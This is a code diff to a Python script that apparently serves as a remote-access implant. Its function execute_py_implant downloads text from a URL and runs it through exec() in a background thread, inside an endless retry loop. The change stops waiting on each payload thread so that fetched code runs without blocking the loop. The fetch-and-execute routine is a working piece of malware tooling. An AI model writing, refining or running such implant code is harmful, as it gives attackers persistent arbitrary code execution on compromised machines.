@@ -6,6 +6,9 @@ from multiprocessing import Process
 import base64
 import threading
 
+global th
+th = None
+
 def exec_py():
     global payload
     exec(payload)
@@ -16,9 +19,9 @@ def execute_py_implant(url,session):
         global payload
         payload = response.text
         try:
+            global th
             th = threading.Thread(target=exec_py)
             th.start()
-            th.join()
         except:
             pass
 
@@ -103,3 +106,6 @@ while True:
             time.sleep(10)
     except:
         time.sleep(20)
+global th
+if th!=None:
+    th.join()
